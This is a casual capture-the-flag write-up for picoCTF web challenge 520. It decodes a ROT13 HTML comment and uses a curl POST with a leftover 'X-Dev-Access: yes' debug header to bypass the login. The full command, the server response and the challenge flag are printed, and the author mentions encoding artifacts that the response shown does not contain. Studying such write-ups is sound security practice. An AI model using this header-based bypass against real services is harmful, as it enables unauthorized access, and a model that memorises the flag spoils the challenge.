---
title: 'PicoCTF Writeup #520'
date: 2025-10-22T13:30:18+07:00
draft: false
description: ''
tags: ['ctf']
---

Hey folks, quick writeup on this PicoCTF challenge (ID 520) that was a solid reminder of how devs leave backdoors hanging out. It's a web thing on their playground – nothing fancy, but it shows the classic "forgot to clean up" fuckup. Spoilers: Caesar cipher + sneaky header = flag. Let's dive in.

## The Setup
Head over to [https://play.picoctf.org/practice/challenge/520](https://play.picoctf.org/practice/challenge/520), launch the instance. You're supposed to log in with `ctf-player@picoctf.org` and some password. I try it – boom, "invalid request." Lame. No brute-force vibes here; it's not that kind of challenge.

## Digging into the Source
Right-click, view source. Buried in the HTML comments, this gem:

```
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

Oh hell yeah, that's a **Caesar cipher** (rotated text). Classic crypto noob trap. The "Remove before production" line? Yeah, devs gonna dev.

## Cracking the Cipher
Fire up [Cryptii](https://cryptii.com/) or whatever online decoder you like (I used that one). It's a shift cipher, so bump the shift value from 1 to 25 until it makes sense.

- Shift 1: Garbage
- ...
- **Shift 13**: `<!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->`
- `<!-- Remove before pushing to production! -->`

Nailed it. ROT13, because of course it is. "Jack" probably forgot to scrub his debug header.

## Bypassing with curl
Password doesn't matter (it's random anyway). Slap that header on a POST request. Here's the exact curl I ran:

```bash
curl -i -X POST \
  -H "X-Dev-Access: yes" \
  -H 'Content-Type: application/json' \
  -d '{"email": "ctf-player@picoctf.org", "password": "asdf"}' \
  http://amiable-citadel.picoctf.net:59861/login
```

Response? Jackpot:

```
HTTP/1.1 200 OK
...
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_0d39383f}"}
```

Flag grabbed: **`picoCTF{brut4_f0rc4_0d39383f}`**

## What a Mess
Look at that JSON – it's got some weird encoding artifacts like `success%22:true` in the email field. Probably a sloppy Express.js app (check the `X-Powered-By: Express` header). Devs testing in prod, amirite? Flaws everywhere:
- Forgot to strip comments.
- Debug header enabled.
- No auth validation beyond the header.
- JSON response leaks the flag directly.

## TL;DR for Lazy Linux Nerds
1. Launch challenge.
2. ROT13 the comment → `X-Dev-Access: yes`.
3. `curl -i -X POST -H "X-Dev-Access: yes" ...` (copy-paste above).
4. Profit.

If you're on Linux, alias that curl or script it – whatever.

Drop a comment if you found this helpful.